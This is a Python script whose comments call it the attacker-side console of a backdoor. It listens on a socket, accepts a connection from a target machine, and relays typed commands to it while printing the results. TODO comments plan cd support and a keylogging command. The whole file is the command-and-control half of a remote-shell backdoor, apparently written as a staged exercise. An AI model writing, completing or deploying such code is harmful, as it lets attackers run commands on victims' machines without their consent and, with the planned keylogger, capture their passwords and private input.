#backdoor to be run from ATTACKER machine
#run me first
#use ctrl+c on my console to close backdoor
import socket
import json
import os
import sys
import subprocess
import threading
import time

#TODO make and use a function named "target_communication" (step 3)
#...name doesn't make sense but whatever

ip = '127.0.0.1'
port = 4141

server = socket.socket()
server.bind((ip, port))

print('listening For target connection ...')
server.listen(1)
client, client_addr = server.accept()
print(f'[+] {client_addr} connected')

#TODO (step 5) make the cd command work basically

#TODO (step 6) "keylog command"

# send commands and receive output in loop
while True:
    command = input('enter command: ')
    command = command.encode()
    client.send(command)
    output = client.recv(1024)
    output = output.decode()
    print(f"output: {output}")



